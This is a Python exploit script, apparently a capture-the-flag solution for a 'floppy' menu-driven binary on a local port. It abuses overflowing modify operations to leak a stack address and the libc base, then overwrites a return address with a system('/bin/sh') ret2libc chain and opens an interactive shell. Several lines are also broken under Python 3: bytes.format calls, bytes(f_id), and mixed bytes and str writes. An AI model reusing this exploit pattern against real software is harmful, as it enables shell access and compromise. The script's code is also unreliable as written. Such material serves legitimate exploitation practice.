#!/bin/env python3
import socket, struct, telnetlib
import re


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rwb', buffering=0)


def read_until(f, delim='\n'):
    data = b''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def write_line(f, data):
    pass


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def skip_menu():
    read_until(f, b'>\n')

def choose(f_id):
    print(b'Choose')
    skip_menu()
    f.write(b'1' + b'\n')
    f.write(bytes(f_id) + b'\n')

def write(data, desc):
    print(b'Write')
    skip_menu()
    f.write(b'2' + b'\n')
    read_until(f, b'Input your data: \n')
    f.write(data + b'\n')
    read_until(f, b'Description: \n')
    f.write(desc + b'\n')


desc_pat = re.compile('DESCRIPTION: (.*)\nDATA:')
data_pat = re.compile('DATA: (.*)\n+=')
def read():
    print(b'Read')
    skip_menu()
    f.write(b'3' + '\n')
    read_until(f, b'FLOPPY')
    data_read = read_until(f, b'=\n')
    print(data_read)
    desc = desc_pat.search(data_read).group(1)
    data = data_pat.search(data_read).group(1)
    return (desc, data)


def modify(edit_id, data):
    print(b'Modify')
    skip_menu()
    f.write(b'4' + '\n')
    read_until(f, b'2 Data\n')
    f.write(bytes(edit_id)  + b'\n')
    read_until(f, b'Input ')
    f.write(data + b'\n')


def exit_():
    print(b'Exit')
    skip_menu()
    f.write(b'5' + '\n')


s, f = sock("127.0.0.1", 4088)

choose(1)
write(b'AAAA', b'BBBB')
modify(1, b'C' * 16)
desc, data = read()
addr_ret_addr = u(desc[16:16+4]) + 0x28 + 0x10
print(b'[+] addr_ret_addr = {}'.format(hex(addr_ret_addr)))

choose(2)
write(b'DDDD', b'EEEE')
modify(1, b'F' * 0x14 + p(addr_ret_addr))
choose(1)
desc, data = read()
print((desc, data))
addr_libc_start_main = u(data[:4]) - 247
addr_libc_base = addr_libc_start_main - 0x18540
print(b'[+] addr_libc_start_main = {}'.format(hex(addr_libc_start_main)))
print(b'[+] addr_libc_base = {}'.format(hex(addr_libc_base)))
addr_system = addr_libc_base + 0x3ada0
addr_binsh = addr_libc_base + 0x15ba0b

buf = b''
buf += p(addr_system)
buf += p(0xdeadbeaf)
buf += p(addr_binsh)

choose(2)
modify(1, b'G' * 0x14 + p(addr_ret_addr))
choose(1)
modify(2, buf)
exit_()


shell(s)
